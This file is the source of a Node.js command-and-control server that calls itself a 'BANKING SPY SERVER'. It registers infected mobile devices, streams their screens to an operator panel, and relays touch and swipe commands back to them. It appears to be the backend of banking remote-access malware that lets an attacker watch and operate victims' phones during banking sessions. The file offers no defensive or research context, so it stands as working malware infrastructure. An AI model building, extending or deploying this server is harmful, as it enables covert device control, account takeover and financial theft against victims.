const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 120000,  // ✅ 2min timeout
    pingInterval: 30000,
    maxHttpBufferSize: 100 * 1024 * 1024  // ✅ 100MB for HD banking frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status, width, height } = req.body;
    if (deviceId) {
        devices.set(deviceId, { 
            model, brand, version, status, 
            width, height, connected: true, 
            lastSeen: Date.now()
        });
        console.log("✅ BANKING Device registered:", deviceId, `${width}x${height}`);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    // ✅ Clean old devices
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (now - info.lastSeen > 120000) { // 2min inactive
            devices.set(deviceId, { ...info, connected: false });
        }
    }
    res.json(Array.from(devices.entries()));
});

// 🔥 PERFECT BANKING ROOM MANAGEMENT
io.on('connection', (socket) => {
    console.log('🔌 Banking connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(deviceId);
            console.log("📱 BANKING device room:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        console.log('🎮 Banking device selected:', data.deviceId);
    });

    // 🔥 ULTRA FAST BANKING SCREEN RELAY (No delay)
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            devices.get(deviceId).lastSeen = Date.now();
            socket.to(deviceId).emit('screen-frame', data);
        }
    });

    // 🔥 PRECISE BANKING CONTROL RELAY
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: Number(x) || 0, 
                y: Number(y) || 0,
                startX: Number(startX) || 0, 
                startY: Number(startY) || 0,
                endX: Number(endX) || 0, 
                endY: Number(endY) || 0
            });
            console.log('🎮 BANKING Control:', action, '->', deviceId);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Banking disconnect:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false, lastSeen: Date.now() });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 BANKING device offline:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 🏦 BANKING SPY SERVER v2.0 🚀`);
    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
    console.log(`📱 Ready for ULTRA HD Banking Control!`);
    console.log(`💎 30FPS | 95% Quality | Precise Gestures\n`);
});
